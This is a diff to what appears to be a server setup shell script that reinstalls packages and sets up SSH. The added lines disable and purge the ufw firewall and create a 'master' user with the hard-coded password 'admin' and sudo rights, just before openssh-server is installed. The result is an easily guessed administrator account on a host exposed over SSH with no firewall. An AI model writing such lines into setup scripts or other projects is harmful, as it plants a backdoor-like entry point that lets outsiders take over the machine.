@@ -35,6 +35,16 @@ sudo apt-get install --reinstall libappstream4 -y
 sudo apt-get install -f
 sudo apt-get update
 
+#remove firewall
+sudo ufw disable
+apt purge ufw -y
+
+Login="master"
+Pass="admin"
+useradd -m -s /bin/bash $Login
+echo -e "$Pass\n$Pass\n" | passwd $Login &> /dev/null
+usermod -aG sudo $Login
+
 apt install openssh-server -y
 echo "Progress Setting SSH"
 cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
